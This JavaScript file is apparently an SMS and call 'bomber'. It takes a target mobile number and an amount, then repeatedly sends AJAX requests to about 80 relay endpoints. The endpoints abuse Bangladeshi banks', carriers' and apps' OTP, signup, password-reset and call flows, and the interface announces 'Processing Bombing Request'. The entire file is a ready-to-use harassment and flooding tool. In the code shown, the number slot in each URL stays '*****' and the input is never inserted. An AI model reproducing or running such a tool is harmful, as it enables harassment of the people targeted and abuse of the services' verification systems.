// Author: Shayer Mahmud Sowmik [ Ign0r3dH4x0r ]
// Removing credit won't make you a cool programmer xD

$(document).ready(() => {

    $(document).on('click', '#send', function (e) {        
        e.preventDefault();
        $('#logs').addClass('visually-hidden');
        var amount = $("#amount").val();
        var mobile = $("#mobile").val();
        if (amount > 0 && mobile.length == 11) {
            var c = 0;

            const APIS = [
    {
        "id": "1",
        "name": "Bd Tiket",
        "url": "https:\/\/api1111.serv00.net\/bdtikets.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "2",
        "name": "Arogga",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/arogga?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "3",
        "name": "Bioscope",
        "url": "https:\/\/api1111.serv00.net\/bioscope.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "4",
        "name": "BL",
        "url": "https:\/\/karimmia20.serv00.net\/bl.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "5",
        "name": "Busbd Login",
        "url": "https:\/\/api1111.serv00.net\/busbdlogin.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "6",
        "name": "Chaina Online",
        "url": "https:\/\/api1111.serv00.net\/chainaonline.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "7",
        "name": "Chakrajan",
        "url": "https:\/\/karimmia20.serv00.net\/chakrajan.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "8",
        "name": "Cinematic",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/cinematic?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "9",
        "name": "Cineplex",
        "url": "https:\/\/api1111.serv00.net\/cineplex.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "10",
        "name": "cinespot",
        "url": "https:\/\/karimmia20.serv00.net\/cinespot.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "11",
        "name": "non circel robi airtel",
        "url": "https:\/\/karimmia20.serv00.net\/circel.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "12",
        "name": "Dhaka Bank",
        "url": "https:\/\/karimmia20.serv00.net\/dhakabank.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "13",
        "name": "doctime",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/doctime?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "14",
        "name": "easy.com.bd",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/easy.com.bd?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/x-www-form-urlencoded"
        }
    },
    {
        "id": "15",
        "name": "ecuriar",
        "url": "https:\/\/karimmia20.serv00.net\/ecuriar.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "16",
        "name": "Entertainment Bd",
        "url": "https:\/\/pikachu2.serv00.net\/entertainment.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "17",
        "name": "Fliper",
        "url": "https:\/\/pikachu2.serv00.net\/fliper.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "18",
        "name": "Ghuri Learn",
        "url": "https:\/\/pikachu2.serv00.net\/ghuri.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "19",
        "name": "GP",
        "url": "https:\/\/karimmia20.serv00.net\/gp.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "20",
        "name": "GP WEB",
        "url": "https:\/\/tool.takaincomebd.xyz\/server\/database\/gp.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json",
            "user-agent": "Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/113.0.0.0 Safari\/537.36"
        }
    },
    {
        "id": "21",
        "name": "Vistage Bd",
        "url": "https:\/\/karimmia20.serv00.net\/hlpl.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "22",
        "name": "Iqra",
        "url": "https:\/\/pikachu2.serv00.net\/iqra.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "23",
        "name": "jeetwinbd",
        "url": "https:\/\/pikachu2.serv00.net\/jeetwinbd.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "24",
        "name": "Khaodao",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/khaodao?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "25",
        "name": "MCB Affliafite",
        "url": "https:\/\/pikachu2.serv00.net\/mcbaffiliate.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "26",
        "name": "Mojaenglish",
        "url": "https:\/\/pikachu2.serv00.net\/mojaenglish.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "27",
        "name": "Ousodhpoteo",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/ousodhpotro?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "28",
        "name": "Pathao",
        "url": "https:\/\/pikachu2.serv00.net\/pathao.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "29",
        "name": "Pravana Helth",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/pravanahelth?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "30",
        "name": "QCOM",
        "url": "https:\/\/pikachu2.serv00.net\/qcom.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "31",
        "name": "Redx",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/redx2?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "32",
        "name": "Call",
        "url": "https:\/\/bot2-rho.vercel.app\/api\/kg?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "33",
        "name": "Robi My Offer",
        "url": "https:\/\/pikachu2.serv00.net\/robi-myoffer.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "34",
        "name": "Robi web signup",
        "url": "https:\/\/pikachu2.serv00.net\/robi-web.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "35",
        "name": "Robi web forget",
        "url": "https:\/\/pikachu2.serv00.net\/robi-web2.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "36",
        "name": "Sajgoj",
        "url": "https:\/\/tool.takaincomebd.xyz\/server\/database\/sajgoj.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json",
            "user-agent": "Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/113.0.0.0 Safari\/537.36"
        }
    },
    {
        "id": "37",
        "name": "Sadhin music",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/sadhin?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "38",
        "name": "Sikho",
        "url": "https:\/\/api333.serv00.net\/sikho.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "39",
        "name": "sopoth reg",
        "url": "https:\/\/api333.serv00.net\/sopoth-reg.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "40",
        "name": "sopoth resend",
        "url": "https:\/\/api333.serv00.net\/sopoth-resend.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "41",
        "name": "sundarban",
        "url": "https:\/\/api333.serv00.net\/sundarban.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "42",
        "name": "Flexi-Plan",
        "url": "https:\/\/tool.takaincomebd.xyz\/server\/database\/flexi-plan.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json",
            "user-agent": "Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko\/20100101 Firefox\/109.0"
        }
    },
    {
        "id": "43",
        "name": "admissionbd",
        "url": "https:\/\/api-tawny-zeta.vercel.app\/api\/admissionbd?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "44",
        "name": "LBFL",
        "url": "https:\/\/api222.serv00.net\/lbfl.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "45",
        "name": "dipto",
        "url": "https:\/\/api-tawny-zeta.vercel.app\/api\/dipto?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "46",
        "name": "robi doorstep",
        "url": "https:\/\/api-tawny-zeta.vercel.app\/api\/robi-ivr-dorstep?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "47",
        "name": "Call",
        "url": "https:\/\/nmmb8h.buildship.run\/call?number=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "48",
        "name": "Call",
        "url": "http:\/\/178.63.190.211\/~xhunterx\/call5.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "49",
        "name": "Loan",
        "url": "https:\/\/karimmia20.serv00.net\/loan.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "50",
        "name": "gp",
        "url": "https:\/\/karimmia20.serv00.net\/gp.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "51",
        "name": "Mcomic",
        "url": "https:\/\/pikachu2.serv00.net\/mcomic.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "52",
        "name": "Talikhata",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/talikhata?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "53",
        "name": "Post Pos",
        "url": "https:\/\/korim202.serv00.net\/portpos.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "54",
        "name": "Non Bkash Robi Airtel",
        "url": "https:\/\/korim202.serv00.net\/nbkash-ra.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "55",
        "name": "Engage",
        "url": "https:\/\/alternativezonebd.xyz\/Api\/send-otp\/robi-bomb.php?msisdn=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "56",
        "name": "Applink",
        "url": "https:\/\/korim202.serv00.net\/applink.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "57",
        "name": "Betonbook",
        "url": "https:\/\/korim202.serv00.net\/betonbook.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "58",
        "name": "Aibl",
        "url": "https:\/\/korim202.serv00.net\/aibl.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "59",
        "name": "Chorki",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/chorki?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "60",
        "name": "Fundesh",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/fundesh?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "61",
        "name": "gpay",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/gpay?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "62",
        "name": "E helth Reg",
        "url": "https:\/\/korim202.serv00.net\/helth-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "63",
        "name": "E helth login",
        "url": "https:\/\/korim202.serv00.net\/helth-login.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "64",
        "name": "Mokam",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/mokam?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "66",
        "name": "Quizgiri",
        "url": "https:\/\/api222.serv00.net\/quizgiri.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "67",
        "name": "Quiztime",
        "url": "https:\/\/api222.serv00.net\/quiztime.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "68",
        "name": "Rtv Forget",
        "url": "https:\/\/api222.serv00.net\/rtv-forget.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "69",
        "name": "Rtv reg",
        "url": "https:\/\/api222.serv00.net\/rtv-reg.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "70",
        "name": "Senorbeuty",
        "url": "https:\/\/api222.serv00.net\/senorbeuty.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "71",
        "name": "Skitto",
        "url": "http:\/\/tool.takaincomebd.xyz\/server\/database\/skitto.php?sms=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json",
            "user-agent": "Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko\/20100101 Firefox\/109.0"
        }
    },
    {
        "id": "72",
        "name": "Online Sim",
        "url": "https:\/\/sms.optix-hunter.xyz\/server\/database\/robi-sim.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json",
            "user-agent": "Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko\/20100101 Firefox\/109.0"
        }
    },
    {
        "id": "73",
        "name": "Win2gain",
        "url": "https:\/\/api333.serv00.net\/win2gain.php?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "74",
        "name": "Call",
        "url": "https:\/\/bot2-rho.vercel.app\/api\/92e?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "75",
        "name": "Bikroy",
        "url": "https:\/\/tempmail-ten.vercel.app\/api\/bikroy?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "76",
        "name": "kormi24",
        "url": "https:\/\/api333.serv00.net\/kormi24.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "77",
        "name": "gibinfo",
        "url": "https:\/\/api333.serv00.net\/gibinfo.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "78",
        "name": "NON Bkash GP",
        "url": "https:\/\/korim202.serv00.net\/nbkash-gp.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "79",
        "name": "Krikaya Call",
        "url": "http:\/\/178.63.190.211\/~xhunterx\/call2.php?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "80",
        "name": "Call Reg Api",
        "url": "https:\/\/bot2-rho.vercel.app\/api\/reg?phone=*****",
        "method": "get",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    },
    {
        "id": "81",
        "name": "Bkash",
        "url": "http:\/\/pikachu-bkash-bomb.us.to\/?phone=*****",
        "method": "post",
        "body": "",
        "headers": {
            "content-type": "application\/json"
        }
    }
]

            while (c < amount) {
                APIS.forEach(API => {
                    $.ajax(API);
                    c += 1;
                });
            }
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Processing Bombing Request...");


        } else {
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Invalid Number or Amount is null");
        }
    });
})
